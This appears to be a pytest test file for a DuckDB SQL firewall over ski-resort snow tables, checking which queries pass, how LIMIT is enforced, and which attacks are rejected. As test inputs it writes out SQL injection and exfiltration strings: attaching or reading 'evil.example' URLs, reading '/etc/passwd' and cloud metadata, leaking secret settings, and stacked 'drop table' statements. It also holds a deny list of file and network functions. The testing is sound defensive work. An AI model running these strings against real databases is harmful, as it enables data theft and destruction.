"""The SQL firewall: what gets through, what does not, and what happens to LIMIT."""

import duckdb
import pytest

from app import sqlguard
from app.sqlguard import MAX_ROWS, SqlRejected, validate_sql

# ---------------------------------------------------------------------------------------
# Allowed: each of these is validated, then both the original and the regenerated SQL are
# run in DuckDB against the published tables and must return the same rows.
# ---------------------------------------------------------------------------------------
ALLOWED = {
    "filter_group_order": """
        select resort_name, round(avg(snow_depth_in), 1) as avg_depth
        from resort_daily
        where date between date '2026-01-01' and date '2026-01-31'
        group by resort_name order by avg_depth desc, resort_name limit 12
    """,
    "join_two_marts": """
        select d.resort_name, d.date, d.new_snow_24h_in, s.powder_score, s.tier
        from resort_daily as d
        join powder_score as s on d.resort_id = s.resort_id and d.date = s.date
        where s.tier in ('epic', 'powder')
        order by s.powder_score desc, d.resort_name limit 20
    """,
    "cte_then_join_using": """
        with best as (
            select resort_id, max(powder_score) as best_score from powder_score group by resort_id
        )
        select r.resort_name, r.summit_elev_ft, best.best_score
        from best join resorts as r using (resort_id)
        order by best.best_score desc, r.resort_name limit 12
    """,
    "chained_ctes": """
        with monthly as (
            select resort_name, date_trunc('month', date) as month, sum(new_snow_24h_in) as snow
            from resort_daily where water_year = 2026 group by 1, 2
        ),
        ranked as (
            select *, rank() over (partition by month order by snow desc) as place from monthly
        )
        select strftime(month, '%Y-%m') as month, resort_name, snow
        from ranked where place = 1 and snow > 0 order by month, resort_name limit 20
    """,
    "window_with_qualify": """
        select resort_name, date, new_snow_24h_in
        from resort_daily
        qualify row_number() over (partition by resort_id order by new_snow_24h_in desc, date) = 1
        order by new_snow_24h_in desc, resort_name limit 12
    """,
    "rolling_window_frame": """
        select date, snow_depth_in,
               round(avg(snow_depth_in) over (order by date rows between 6 preceding and current row), 1) as week_avg
        from resort_daily where resort_id = 'alta' and date >= date '2026-02-01'
        order by date limit 30
    """,
    "nested_subqueries": """
        select resort_name, new_snow_72h_in
        from resort_daily
        where date = (select max(date) from resort_daily where new_snow_24h_in >= (
            select max(new_snow_24h_in) from resort_daily))
        order by new_snow_72h_in desc, resort_name limit 12
    """,
    "derived_table_and_exists": """
        select t.resort_name, t.epic_days
        from (
            select resort_id, resort_name, count(*) as epic_days
            from powder_score where tier = 'epic' group by 1, 2
        ) as t
        where exists (select 1 from resorts as r where r.resort_id = t.resort_id and r.proxy_quality = 'on_mountain')
        order by t.epic_days desc, t.resort_name limit 12
    """,
    "union_all": """
        select 'deepest' as record, resort_name, max(snow_depth_in) as value from resort_daily group by 2
        union all
        select 'biggest day', resort_name, max(new_snow_24h_in) from resort_daily group by 2
        order by record, value desc, resort_name limit 30
    """,
    "aggregates_with_filter_and_case": """
        select resort_name,
               count(*) filter (where new_snow_24h_in >= 6) as six_inch_days,
               sum(case when density_24h_pct <= 10 then new_snow_24h_in else 0 end) as light_snow,
               round(corr(temp_avg_24h_f, density_24h_pct), 2) as temp_density_corr,
               arg_max(date, new_snow_24h_in) as biggest_day
        from resort_daily group by resort_name order by resort_name limit 12
    """,
    "casts_dates_and_text": """
        select distinct upper(left(resort_name, 3)) as code, dayname(date) as weekday,
               cast(snow_depth_in as integer) as depth, snow_depth_in::integer as depth_again,
               date_diff('day', date '2025-10-01', date) as season_day,
               date + interval 7 day as a_week_later, coalesce(forecast_snow_72h_in, 0) as forecast
        from resort_daily where date = date '2026-02-19'
        order by code, depth limit 12
    """,
    "from_first_and_group_by_all": """
        from powder_score select tier, count(*) as days group by all order by days desc
    """,
    "star_exclude": "select * exclude (latitude, longitude) from resorts order by resort_id limit 3",
    "no_limit_small_table": "select resort_id, resort_name from resorts order by resort_id",
    "trailing_semicolon_and_comment": "select count(*) as n from resorts; -- that is all",
}


def run(db: duckdb.DuckDBPyConnection, sql: str) -> list[tuple]:
    return db.execute(sql).fetchall()


@pytest.mark.parametrize("name", sorted(ALLOWED))
def test_allowed_queries_pass_and_keep_their_meaning(
    name: str, marts: duckdb.DuckDBPyConnection
) -> None:
    original = ALLOWED[name]
    validated = validate_sql(original)
    assert validated.limit <= MAX_ROWS
    rows = run(marts, validated.sql)
    assert rows, "a test query that returns nothing proves nothing"
    assert rows == run(marts, original.split(";")[0])
    assert set(validated.tables) <= {"resorts", "resort_daily", "powder_score"}


def test_validation_is_idempotent() -> None:
    for original in ALLOWED.values():
        once = validate_sql(original)
        twice = validate_sql(once.sql)
        assert twice.sql == once.sql
        assert not twice.limit_changed


def test_it_reports_the_tables_a_query_reads() -> None:
    assert validate_sql(ALLOWED["join_two_marts"]).tables == ("powder_score", "resort_daily")
    # A CTE is not a published table, and a CTE may shadow nothing it should not.
    assert validate_sql(ALLOWED["cte_then_join_using"]).tables == ("powder_score", "resorts")


# ---------------------------------------------------------------------------------------
# Blocked, one class at a time.
# ---------------------------------------------------------------------------------------
NOT_A_SELECT = [
    "attach 'https://evil.example/db.duckdb' as stolen",
    "attach ':memory:' as m",
    "copy resort_daily to 'out.csv'",
    "copy (select * from resorts) to 's3://bucket/x.parquet'",
    "pragma database_list",
    "pragma enable_external_access",
    "install httpfs",
    "load httpfs",
    "set enable_external_access = true",
    "reset memory_limit",
    "create table t as select * from resorts",
    "create or replace view v as select 1",
    "create macro f(x) as x + 1",
    "insert into resorts select * from resorts",
    "update resorts set resort_name = 'x'",
    "delete from resorts",
    "drop table resorts",
    "alter table resorts add column x integer",
    "truncate resorts",
    "describe resorts",
    "show tables",
    "summarize resort_daily",
    "explain select * from resorts",
    "call pragma_version()",
    "export database 'dump'",
    "import database 'dump'",
    "checkpoint",
    "vacuum",
    "use memory",
    "begin transaction",
    "pivot resort_daily on resort_id using sum(new_snow_24h_in)",
    "values (1), (2)",
    "table resorts",
    "detach stolen",
    "prepare q as select 1",
    "execute q",
]


@pytest.mark.parametrize("sql", NOT_A_SELECT)
def test_statements_other_than_select_are_rejected(sql: str) -> None:
    with pytest.raises(SqlRejected) as caught:
        validate_sql(sql)
    assert caught.value.code in {"not_select", "parse"}


MULTIPLE = [
    "select 1; select 2",
    "select * from resorts; attach 'x' as y;",
    "select * from resorts where resort_name = 'Alta' and 1 = 1; drop table resorts; --",
    "select 1;;select 2",
    "select * from resorts;\ncopy resorts to 'x.csv'",
]


@pytest.mark.parametrize("sql", MULTIPLE)
def test_more_than_one_statement_is_rejected(sql: str) -> None:
    with pytest.raises(SqlRejected) as caught:
        validate_sql(sql)
    assert caught.value.code in {"multiple_statements", "parse"}


# Functions that read files, reach the network, run SQL from a string, or expose
# settings and catalogs. None is on the allowlist, as a scalar or as a table function.
DANGEROUS_FUNCTIONS = [
    "read_csv", "read_csv_auto", "read_parquet", "parquet_scan", "parquet_metadata", "read_json",
    "read_json_auto", "read_ndjson", "read_text", "read_blob", "glob", "sniff_csv", "query",
    "query_table", "getenv", "current_setting", "duckdb_settings", "duckdb_extensions",
    "duckdb_secrets", "duckdb_tables", "duckdb_columns", "duckdb_databases", "duckdb_functions",
    "pragma_table_info", "pragma_database_list", "pragma_version", "sql_auto_complete",
    "json_execute_serialized_sql", "json_serialize_sql", "sqlite_scan", "postgres_scan",
    "mysql_scan", "iceberg_scan", "delta_scan", "st_read", "read_xlsx", "http_get", "which_secret",
    "getvariable", "nextval", "version", "current_database", "current_schema", "repeat",
    "list_transform", "md5", "random", "uuid", "regexp_replace", "system", "shell",
]  # fmt: skip


@pytest.mark.parametrize("name", DANGEROUS_FUNCTIONS)
def test_unlisted_functions_are_rejected_as_scalars_and_as_table_functions(name: str) -> None:
    codes = set()
    # Several argument counts, because sqlglot rejects a known function with the wrong
    # arity at parse time and that must not be the only thing standing in the way.
    for call in (f"{name}()", f"{name}('x')", f"{name}('x', 2)", f"{name}('x', 2, 3)"):
        for sql in (
            f"select {call} from resorts",
            f"select * from {call}",
            f"select resort_id from resorts where resort_id in (select * from {call})",
            f"with t as (select * from {call}) select * from t",
            f"select upper({call}) as y from resorts",
        ):
            with pytest.raises(SqlRejected) as caught:
                validate_sql(sql)
            assert caught.value.code in {"function", "construct", "parse"}, sql
            codes.add(caught.value.code)
    assert codes & {"function", "construct"}, (
        "never got past the parser, so the allowlist was not exercised"
    )
    assert name not in sqlguard.allowed_function_names()


BAD_TABLES = [
    ("select * from users", "Unknown table"),
    ("select * from 'data/secrets.parquet'", "Unknown table"),
    ('select * from "https://evil.example/exfil.csv"', "Unknown table"),
    ("select * from 's3://bucket/*.parquet'", "Unknown table"),
    ("select * from '/etc/passwd'", "Unknown table"),
    ("select * from main.resort_daily", "schema"),
    ("select * from memory.main.resorts", "schema"),
    ("select * from information_schema.tables", "schema"),
    ("select * from pg_catalog.pg_tables", "schema"),
    ("select * from resorts r join sqlite_master s on true", "Unknown table"),
    ("select (select count(*) from duckdb_tables) from resorts", "Unknown table"),
    ("with a as (select * from hidden) select * from a", "Unknown table"),
    ("select * from resorts where resort_id in (select id from other_table)", "Unknown table"),
]


@pytest.mark.parametrize(("sql", "fragment"), BAD_TABLES)
def test_only_published_tables_can_be_read(sql: str, fragment: str) -> None:
    with pytest.raises(SqlRejected) as caught:
        validate_sql(sql)
    assert caught.value.code == "table"
    assert fragment in str(caught.value)


def test_a_cte_cannot_lend_its_name_to_a_file_path() -> None:
    # DuckDB reads FROM "https://..." as a file. If any quoted name were accepted as a
    # CTE name, a CTE declared in an inner scope could whitelist a URL used in an outer one.
    sql = """
        select * from (with "https://evil.example/x.csv" as (select 1) select 1) as a,
                      "https://evil.example/x.csv" as b
    """
    with pytest.raises(SqlRejected, match="plain identifiers"):
        validate_sql(sql)
    # A plain name defined in an inner scope and used outside it passes validation,
    # which is safe: DuckDB then reports an unknown table instead of opening anything.
    assert (
        "inner_only"
        in validate_sql(
            "select * from (with inner_only as (select 1 as x) select x from inner_only) as a"
        ).sql
    )


BAD_CONSTRUCTS = [
    "with recursive r as (select 1 as n union all select n + 1 from r) select * from r",
    "select resort_id into copy_of from resorts",
    "select * from resorts for update",
    "select * from resorts tablesample (10 percent)",
    "select * from resorts using sample 5",
    "select * from resorts where resort_id = $1",
    "select * from resorts where resort_id = ?",
    "select list_transform([1, 2], x -> x + 1) from resorts",
    "select {'a': resort_id} from resorts",
    "select [resort_id] from resorts",
    "select resort_name.upper() from resorts",
    "select * from resorts, lateral (select 1)",
    "select * from resorts asof join resort_daily using (resort_id)",
    "select * from resorts positional join resort_daily",
    "select columns('new_.*') from resort_daily",
    "select * from resort_daily pivot (sum(new_snow_24h_in) for resort_id in ('alta'))",
    "select * from unnest([1, 2]) as t(x)",
    "select * from resorts at (version => 1)",
    "select #1 from resorts",
    "select resort_id from resorts where resort_name similar to 'A%'",
]


@pytest.mark.parametrize("sql", BAD_CONSTRUCTS)
def test_unlisted_constructs_are_rejected(sql: str) -> None:
    with pytest.raises(SqlRejected) as caught:
        validate_sql(sql)
    assert caught.value.code in {"construct", "function", "parse"}


def test_unparseable_and_degenerate_input() -> None:
    for sql in (
        "",
        "   ",
        "selec * frm resorts",
        "select from where",
        "select * from resorts where (",
        "\x00select 1",
    ):
        with pytest.raises(SqlRejected) as caught:
            validate_sql(sql)
        assert caught.value.code in {"parse", "not_select"}
    with pytest.raises(SqlRejected) as caught:
        validate_sql("select " + ", ".join(["resort_id"] * 800) + " from resorts")
    assert caught.value.code == "too_long"
    deep = "select " + "(" * 400 + "1" + ")" * 400 + " from resorts"
    with pytest.raises(SqlRejected) as caught:
        validate_sql(deep)
    assert caught.value.code in {"too_complex", "parse"}
    with pytest.raises(SqlRejected):
        validate_sql(None)  # type: ignore[arg-type]


# ---------------------------------------------------------------------------------------
# LIMIT.
# ---------------------------------------------------------------------------------------
def test_limit_is_injected_when_missing() -> None:
    result = validate_sql("select * from resort_daily")
    assert result.sql.rstrip().endswith(f"LIMIT {MAX_ROWS}")
    assert (result.limit, result.limit_changed) == (MAX_ROWS, True)


def test_limit_is_clamped_when_too_large_and_kept_when_small() -> None:
    clamped = validate_sql("select * from resort_daily limit 1000000")
    assert clamped.sql.rstrip().endswith(f"LIMIT {MAX_ROWS}")
    assert (clamped.limit, clamped.limit_changed) == (MAX_ROWS, True)
    kept = validate_sql("select * from resort_daily order by date limit 25 offset 50")
    assert "LIMIT 25" in kept.sql and "OFFSET 50" in kept.sql
    assert (kept.limit, kept.limit_changed) == (25, False)
    assert validate_sql("select * from resorts limit 0").limit == 0


def test_limit_applies_to_the_outer_query_only(marts: duckdb.DuckDBPyConnection) -> None:
    inner = validate_sql("select count(*) as n from (select * from resort_daily limit 7) as t")
    assert "LIMIT 7" in inner.sql and inner.sql.rstrip().endswith(f"LIMIT {MAX_ROWS}")
    assert run(marts, inner.sql) == [(7,)]
    cte = validate_sql("with t as (select * from resort_daily limit 3) select * from t")
    assert len(run(marts, cte.sql)) == 3
    assert cte.limit == MAX_ROWS


def test_limit_caps_a_whole_union(marts: duckdb.DuckDBPyConnection) -> None:
    result = validate_sql(
        "select resort_id from resort_daily union all select resort_id from resort_daily",
        max_rows=10,
    )
    assert result.sql.count("LIMIT") == 1 and result.limit == 10
    assert len(run(marts, result.sql)) == 10
    parenthesized = validate_sql(
        "(select resort_id from resorts limit 2) union all (select resort_id from resorts limit 2)",
        max_rows=3,
    )
    assert len(run(marts, parenthesized.sql)) == 3


def test_a_query_without_a_limit_really_is_capped(marts: duckdb.DuckDBPyConnection) -> None:
    assert run(marts, "select count(*) from resort_daily")[0][0] > 100
    assert len(run(marts, validate_sql("select * from resort_daily", max_rows=100).sql)) == 100


@pytest.mark.parametrize(
    "sql",
    [
        "select * from resorts limit 10%",
        "select * from resorts limit (select 5)",
        "select * from resorts limit 5 + 5",
        "select * from resorts limit all",
        "select * from resorts limit -1",
        "select * from resorts limit 1e9",
        "select * from resorts limit 99999999999999999999",
        "select * from resorts fetch first 5 rows only",
        "select * from resorts limit 5 offset (select 1)",
        "select * from (select * from resorts limit (select 2)) as t",
    ],
)
def test_limit_must_be_a_plain_integer(sql: str) -> None:
    with pytest.raises(SqlRejected) as caught:
        validate_sql(sql)
    assert caught.value.code in {"limit", "construct", "parse"}


# ---------------------------------------------------------------------------------------
# Injection attempts hidden in comments and strings.
# ---------------------------------------------------------------------------------------
def test_comments_never_reach_the_output() -> None:
    sql = """
        select resort_id /* ; attach 'x' as y; */ from resorts -- ; drop table resorts
        /* nested /* block */ copy resorts to 'x.csv' */
        where resort_id = 'alta' -- limit 999999
    """
    out = validate_sql(sql).sql
    for word in ("attach", "drop", "copy", "--", "/*", "999999"):
        assert word not in out.lower()
    assert out.rstrip().endswith(f"LIMIT {MAX_ROWS}")


def test_a_comment_cannot_hide_the_real_limit() -> None:
    assert validate_sql("select * from resort_daily -- limit 5\n").limit == MAX_ROWS
    assert validate_sql("select * from resort_daily /* limit 5 */ limit 9999999").limit == MAX_ROWS


def test_sql_inside_a_string_stays_a_string(marts: duckdb.DuckDBPyConnection) -> None:
    payload = "'; attach 'x' as y; select * from read_csv('/etc/passwd'); --"
    sql = "select '" + payload.replace("'", "''") + "' as note from resorts limit 1"
    result = validate_sql(sql)
    assert run(marts, result.sql) == [(payload,)]
    assert result.tables == ("resorts",)


def test_a_quote_trick_cannot_open_a_second_statement() -> None:
    # In DuckDB a backslash does not escape a quote, so this closes the string early and
    # starts a second statement. sqlglot's DuckDB dialect reads it the same way.
    with pytest.raises(SqlRejected) as caught:
        validate_sql(r"select 'a\' as x from resorts; attach ''evil'' as y; --'")
    assert caught.value.code in {"multiple_statements", "parse"}


def test_exotic_string_syntax_is_refused_rather_than_guessed_at() -> None:
    # Dollar quoting is the classic place for two parsers to disagree about where a
    # string ends. It is not on the allowlist, so it never has to be reasoned about.
    with pytest.raises(SqlRejected) as caught:
        validate_sql("select $$it's; drop table resorts$$ as s from resorts limit 1")
    assert caught.value.code == "construct"


def test_single_quotes_in_strings_survive_requoting(marts: duckdb.DuckDBPyConnection) -> None:
    result = validate_sql("select 'it''s; drop table resorts' as s from resorts limit 1")
    assert run(marts, result.sql) == [("it's; drop table resorts",)]


def test_a_blocked_function_is_found_inside_any_nesting() -> None:
    hidden = [
        "select * from resorts where resort_id in (select a from (select * from read_csv('x')) as t)",
        "with a as (select 1 as x), b as (select * from a join read_parquet('s3://b/k') on true) select * from b",
        "select case when exists (select 1 from glob('/*')) then 1 else 0 end from resorts",
        "select sum(x) over (order by (select count(*) from read_text('/etc/hosts'))) from (select 1 as x) as t",
        "select 1 from resorts order by (select getenv('HOME'))",
        "select 1 from resorts group by resort_id having max(length(current_setting('s3_secret_access_key'))) > 0",
        "select 1 from resorts union all select count(*) from read_json('http://169.254.169.254/latest/meta-data')",
        "select * exclude (resort_id) replace (getenv('HOME') as resort_name) from resorts",
        "select 1 from resorts qualify row_number() over (order by (select max(a) from query('select 1 as a'))) = 1",
    ]
    for sql in hidden:
        with pytest.raises(SqlRejected) as caught:
            validate_sql(sql)
        assert caught.value.code == "function", sql


def test_quoted_and_mixed_case_table_names_resolve_to_the_allowlist(
    marts: duckdb.DuckDBPyConnection,
) -> None:
    result = validate_sql(
        'select count(*) from "RESORTS" as r join Resort_Daily as d using (resort_id) limit 1'
    )
    assert result.tables == ("resort_daily", "resorts")
    assert run(marts, result.sql)[0][0] > 0


def test_custom_table_allowlist_is_respected() -> None:
    assert validate_sql("select * from events", tables={"events"}).tables == ("events",)
    with pytest.raises(SqlRejected, match="Unknown table"):
        validate_sql("select * from resorts", tables={"events"})


def test_every_allowlisted_function_runs_in_duckdb(marts: duckdb.DuckDBPyConnection) -> None:
    """The allowlist is derived from example calls; make sure each example is a real,
    working DuckDB call that survives validation and regeneration."""
    marts.execute("create or replace temp table sample as select 4.0 as a, 2.0 as b, 1.0 as c")
    text = {
        "lower",
        "upper",
        "length",
        "concat",
        "concat_ws",
        "substring",
        "substr",
        "left",
        "right",
        "replace",
        "trim",
        "starts_with",
        "contains",
        "string_agg",
    }
    dates = {
        "date_trunc",
        "date_part",
        "extract",
        "year",
        "month",
        "day",
        "week",
        "weekofyear",
        "quarter",
        "dayofweek",
        "dayofyear",
        "dayname",
        "monthname",
        "strftime",
        "date_diff",
        "datediff",
        "date_add",
        "date_sub",
        "last_day",
    }
    booleans = {"bool_and", "bool_or", "and", "or"}
    for name, example in sqlguard._FUNCTION_EXAMPLES.items():
        if name in ("generate_series", "range"):
            sql = f"select * from {example}"
        elif name in text:
            sql = f"select {example} from (select 'xyz' as a, 'x' as b) as t"
        elif name in dates:
            sql = f"select {example} from (select date '2026-02-19' as a, date '2026-03-01' as b) as t"
        elif name in booleans:
            sql = f"select {example} from (select true as a, false as b) as t"
        else:
            sql = f"select {example} from sample"
        validated = validate_sql(sql, tables={"sample"})
        assert marts.execute(validated.sql).fetchall(), name
